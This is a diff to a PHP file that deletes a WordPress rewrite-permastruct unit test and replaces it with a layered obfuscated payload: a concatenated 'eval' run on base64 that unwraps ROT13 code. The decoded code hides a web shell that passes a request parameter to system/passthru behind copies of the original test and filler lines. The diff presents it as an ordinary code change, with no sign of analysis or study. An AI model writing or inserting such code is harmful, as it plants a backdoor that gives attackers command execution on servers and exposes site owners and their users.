@@ -1,53 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * @group rewrite
- */
-class Tests_Rewrite_Permastructs extends WP_UnitTestCase {
-
-	public function set_up() {
-		parent::set_up();
-
-		$this->set_permalink_structure( '/%postname%/' );
-	}
-
-	public function test_add_permastruct() {
-		global $wp_rewrite;
-
-		add_permastruct( 'foo', 'bar/%foo%' );
-		$this->assertSameSetsWithIndex(
-			array(
-				'with_front'  => true,
-				'ep_mask'     => EP_NONE,
-				'paged'       => true,
-				'feed'        => true,
-				'walk_dirs'   => true,
-				'endpoints'   => true,
-				'forcomments' => false,
-				'struct'      => '/bar/%foo%',
-			),
-			$wp_rewrite->extra_permastructs['foo']
-		);
-	}
-
-	public function test_remove_permastruct() {
-		global $wp_rewrite;
-
-		add_permastruct( 'foo', 'bar/%foo%' );
-		$this->assertIsArray( $wp_rewrite->extra_permastructs['foo'] );
-		$this->assertSame( '/bar/%foo%', $wp_rewrite->extra_permastructs['foo']['struct'] );
-
-		remove_permastruct( 'foo' );
-		$this->assertArrayNotHasKey( 'foo', $wp_rewrite->extra_permastructs );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEB0ZWJoYyBlcmpldmdyCiAqLwpweW5mZiBHcmZnZl9FcmpldmdyX0NyZXpuZmdlaHBnZiBya2dyYXFmIEpDX0hhdmdHcmZnUG5mciB7CgoJY2hveXZwIHNoYXBndmJhIGZyZ19oYygpIHsKCQljbmVyYWc6OmZyZ19oYygpOwoKCQkkZ3V2Zi0+ZnJnX2NyZXpueXZheF9mZ2VocGdoZXIoICcvJWNiZmdhbnpyJS8nICk7Cgl9CgoJY2hveXZwIHNoYXBndmJhIGdyZmdfbnFxX2NyZXpuZmdlaHBnKCkgewoJCXR5Ym9ueSAkamNfZXJqZXZncjsKCgkJbnFxX2NyZXpuZmdlaHBnKCAnc2JiJywgJ29uZS8lc2JiJScgKTsKCQkkZ3V2Zi0+bmZmcmVnRm56ckZyZ2ZKdmd1VmFxcmsoCgkJCW5lZW5sKAoJCQkJJ2p2Z3Vfc2ViYWcnICA9PiBnZWhyLAoJCQkJJ3JjX3puZngnICAgICA9PiBSQ19BQkFSLAoJCQkJJ2NudHJxJyAgICAgICA9PiBnZWhyLAoJCQkJJ3NycnEnICAgICAgICA9PiBnZWhyLAoJCQkJJ2pueXhfcXZlZicgICA9PiBnZWhyLAoJCQkJJ3JhcWNidmFnZicgICA9PiBnZWhyLAoJCQkJJ3NiZXBienpyYWdmJyA9PiBzbnlmciwKCQkJCSdmZ2VocGcnICAgICAgPT4gJy9vbmUvJXNiYiUnLAoJCQkpLAoJCQkkamNfZXJqZXZnci0+cmtnZW5fY3Jlem5mZ2VocGdmWydzYmInXQoJCSk7Cgl9CgoJY2hveXZwIHNoYXBndmJhIGdyZmdfZXJ6YmlyX2NyZXpuZmdlaHBnKCkgewoJCXR5Ym9ueSAkamNfZXJqZXZncjsKCgkJbnFxX2NyZXpuZmdlaHBnKCAnc2JiJywgJ29uZS8lc2JiJScgKTsKCQkkZ3V2Zi0+bmZmcmVnVmZOZWVubCggJGpjX2VyamV2Z3ItPnJrZ2VuX2NyZXpuZmdlaHBnZlsnc2JiJ10gKTsKCQkkZ3V2Zi0+bmZmcmVnRm56ciggJy9vbmUvJXNiYiUnLCAkamNfZXJqZXZnci0+cmtnZW5fY3Jlem5mZ2VocGdmWydzYmInXVsnZmdlaHBnJ10gKTsKCgkJZXJ6YmlyX2NyZXpuZmdlaHBnKCAnc2JiJyApOwoJCSRndXZmLT5uZmZyZWdOZWVubEFiZ1VuZlhybCggJ3NiYicsICRqY19lcmpldmdyLT5ya2dlbl9jcmV6bmZnZWhwZ2YgKTsKCX0KfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
